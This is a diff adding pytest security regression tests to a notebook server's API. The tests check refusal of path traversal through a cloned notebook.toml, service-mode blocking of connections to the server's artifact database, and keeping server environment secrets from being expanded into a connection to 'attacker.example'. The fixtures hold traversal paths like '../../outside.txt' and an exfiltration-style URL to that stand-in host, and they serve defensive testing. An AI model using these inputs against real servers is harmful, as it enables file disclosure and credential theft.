@@ -346,6 +346,22 @@ def test_open_notebook_not_found(client):
     assert response.status_code == 404
 
 
+def test_open_refuses_a_notebook_whose_cell_file_leaves_cells(client, tmp_path):
+    """A cloned notebook.toml naming ``../../x`` must not show that file or let edits rewrite it."""
+    notebook_dir = create_notebook(tmp_path / "nbs", "Cloned")
+    add_cell_to_notebook(notebook_dir, "c1")
+    (tmp_path / "outside.txt").write_text("SECRET\n")
+    toml_path = notebook_dir / "notebook.toml"
+    toml_path.write_text(
+        toml_path.read_text().replace('file = "c1.py"', 'file = "../../outside.txt"')
+    )
+
+    response = client.post("/v1/notebooks/open", json={"path": str(notebook_dir)})
+
+    assert response.status_code == 400
+    assert "'c1' names a source file outside cells/" in response.json()["detail"]
+
+
 def test_open_notebook_rejects_path_outside_configured_storage_root(client, monkeypatch, tmp_path):
     storage_root = tmp_path / "allowed"
     storage_root.mkdir()
@@ -1411,6 +1427,43 @@ def test_secret_env_values_never_reach_clients(client, tmp_path):
     assert session.notebook_state.env == {"OPENAI_API_KEY": "sk-new"}
 
 
+def test_saving_the_env_panel_keeps_a_secret_reader_ready(client, tmp_path):
+    """Staleness after a save sees the secret the cells run with, not the blank on disk."""
+    from strata.notebook.executor import CellExecutor
+    from strata.notebook.secret_manager.session_integration import MASKED_ENV_VALUE
+
+    notebook_dir = create_notebook(tmp_path, "Env Save Status")
+    add_cell_to_notebook(notebook_dir, "c1")
+    reader = 'import os\nk = os.environ.get("MY_API_KEY", "")'
+    write_cell(notebook_dir, "c1", reader)
+    add_cell_to_notebook(notebook_dir, "c2", "c1")
+    write_cell(notebook_dir, "c2", "y = len(k)")
+    session_id = open_session_id(client, notebook_dir)
+    response = client.put(f"/v1/notebooks/{session_id}/env", json={"env": {"MY_API_KEY": "sk-1"}})
+    assert response.status_code == 200, response.text
+    session = get_session_manager().get_session(session_id)
+    assert session is not None
+    for cell_id, source in (("c1", reader), ("c2", "y = len(k)")):
+        result = asyncio.run(CellExecutor(session).execute_cell(cell_id, source))
+        assert result.success, result.error
+
+    # The panel sends every row back, the secret as the masked marker.
+    response = client.put(
+        f"/v1/notebooks/{session_id}/env",
+        json={"env": {"MY_API_KEY": MASKED_ENV_VALUE, "LOG_LEVEL": "info"}},
+    )
+
+    assert response.status_code == 200, response.text
+    assert {cell["id"]: cell["status"] for cell in response.json()["cells"]} == {
+        "c1": "ready",
+        "c2": "ready",
+    }
+    assert {cell.id: cell.status.value for cell in session.notebook_state.cells} == {
+        "c1": "ready",
+        "c2": "ready",
+    }
+
+
 @pytest.mark.parametrize(
     "others",
     [{}, {"LOG_LEVEL": "info"}],
@@ -2020,6 +2073,111 @@ def test_get_connection_schema_endpoint_unknown_connection_404(client, tmp_path)
     assert "nope" in resp.json()["detail"]
 
 
+def _service_mode_sessions(monkeypatch, tmp_path):
+    """Sessions see a service-mode server whose artifact store holds a SQLite file."""
+    import sqlite3
+
+    from strata.config import StrataConfig
+    from strata.notebook.session import NotebookSession
+
+    store = tmp_path / "state" / "artifacts" / "artifacts.sqlite"
+    store.parent.mkdir(parents=True)
+    with sqlite3.connect(store) as conn:
+        conn.execute("CREATE TABLE artifact_publications (token TEXT)")
+    config = StrataConfig(
+        cache_dir=tmp_path / "state" / "cache",
+        artifact_dir=store.parent,
+        deployment_mode="service",
+    )
+    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
+    return store
+
+
+def test_service_mode_refuses_saving_a_connection_to_a_server_file(client, tmp_path, monkeypatch):
+    store = _service_mode_sessions(monkeypatch, tmp_path)
+    notebook_dir = create_notebook(tmp_path / "notebooks", "Conn Confined")
+    nb_id = open_session_id(client, notebook_dir)
+
+    for connection in (
+        {"name": "db", "driver": "sqlite", "path": str(store)},
+        {"name": "db", "driver": "sqlite", "uri": f"file:{store}"},
+        {"name": "db", "driver": "duckdb", "path": f"../../state/artifacts/{store.name}"},
+    ):
+        resp = client.put(f"/v1/notebooks/{nb_id}/connections", json={"connections": [connection]})
+
+        assert resp.status_code == 400, connection
+        assert "connection 'db'" in resp.json()["detail"]
+    resp = client.put(
+        f"/v1/notebooks/{nb_id}/connections",
+        json={"connections": [{"name": "db", "driver": "sqlite", "path": "mine.sqlite"}]},
+    )
+    assert resp.status_code == 200, resp.text
+
+
+def test_service_mode_schema_route_refuses_a_server_file(client, tmp_path, monkeypatch):
+    pytest.importorskip("adbc_driver_sqlite")
+    store = _service_mode_sessions(monkeypatch, tmp_path)
+    notebook_dir = create_notebook(tmp_path / "notebooks", "Schema Confined")
+    toml = notebook_dir / "notebook.toml"
+    toml.write_text(toml.read_text() + f'\n[connections.db]\ndriver = "sqlite"\npath = "{store}"\n')
+    nb_id = open_session_id(client, notebook_dir)
+
+    resp = client.get(f"/v1/notebooks/{nb_id}/connections/db/schema")
+
+    assert resp.status_code == 400, resp.text
+    assert "artifact_publications" not in resp.text
+
+
+@pytest.mark.parametrize("mode", ["personal", "service"])
+def test_connection_auth_vars_read_the_notebook_env_in_service_mode(
+    client, tmp_path, monkeypatch, mode
+):
+    """``${VAR}`` in a connection's auth must not send the server's environment to a
+    host a member chose, nor say whether the server has the variable."""
+    from strata.config import StrataConfig
+    from strata.notebook.session import NotebookSession
+    from strata.notebook.sql.drivers.postgresql import PostgresAdapter
+
+    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode=mode)
+    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
+    monkeypatch.setenv("SERVER_ONLY_TOKEN", "server-secret")
+    dialed: list[str] = []
+
+    def record(self, uri):
+        dialed.append(uri)
+        raise RuntimeError("not dialing")
+
+    monkeypatch.setattr(PostgresAdapter, "_invoke_connect", record)
+    notebook_dir = create_notebook(tmp_path / "notebooks", "Conn Env")
+    toml = notebook_dir / "notebook.toml"
+    toml.write_text(
+        toml.read_text()
+        + '\n[env]\nNB_USER = "nb-user"\n'
+        + '\n[connections.server]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.server.auth]\nuser = "${SERVER_ONLY_TOKEN}"\n'
+        + '\n[connections.missing]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.missing.auth]\nuser = "${NOT_SET_ANYWHERE}"\n'
+        + '\n[connections.notebook]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.notebook.auth]\nuser = "${NB_USER}"\n'
+    )
+    nb_id = open_session_id(client, notebook_dir)
+
+    server = client.get(f"/v1/notebooks/{nb_id}/connections/server/schema")
+    missing = client.get(f"/v1/notebooks/{nb_id}/connections/missing/schema")
+    notebook = client.get(f"/v1/notebooks/{nb_id}/connections/notebook/schema")
+
+    assert notebook.status_code == 502
+    if mode == "personal":
+        assert dialed == ["postgresql://server-secret@attacker.example:5432/postgres"]
+        assert missing.status_code == 502
+        return
+    assert dialed == ["postgresql://nb-user@attacker.example:5432/postgres"]
+    assert server.status_code == missing.status_code == 400
+    assert server.json()["detail"].replace("SERVER_ONLY_TOKEN", "X") == missing.json()[
+        "detail"
+    ].replace("NOT_SET_ANYWHERE", "X").replace("'missing'", "'server'")
+
+
 # Export
 
 
@@ -2063,6 +2221,33 @@ def test_export_endpoint_html_format(client, tmp_path):
     assert "text/html" in resp.headers["content-type"]
     assert resp.text.startswith("<!doctype html>")
     assert ".html" in resp.headers["content-disposition"]
+
+
+@pytest.mark.parametrize(
+    ("path", "suffix"),
+    [
+        ("export", ".zip"),
+        ("export?fmt=snapshot&include=none", ".snapshot.zip"),
+        ("export?fmt=markdown", ".md"),
+        ("environment/requirements.txt", "-requirements.txt"),
+    ],
+)
+def test_a_non_latin_1_notebook_name_downloads_under_an_ascii_name(client, tmp_path, path, suffix):
+    """Headers go out as latin-1, so the raw name 500s; the original rides in ``filename*``."""
+    from urllib.parse import unquote
+
+    notebook_dir = create_notebook(tmp_path, "分析 notebook", initialize_environment=False)
+    nb_id = open_session_id(client, notebook_dir)
+
+    resp = client.get(f"/v1/notebooks/{nb_id}/{path}")
+
+    assert resp.status_code == 200, resp.text
+    disposition = resp.headers["content-disposition"]
+    ascii_name, _, encoded = disposition.partition("; filename*=UTF-8''")
+    assert ascii_name.startswith('attachment; filename="')
+    assert ascii_name.endswith(f'{suffix}"')
+    assert ascii_name.isascii()
+    assert unquote(encoded).startswith("分析") and unquote(encoded).endswith(suffix)
 
 
 def test_export_endpoint_rejects_unknown_format(client, tmp_path):
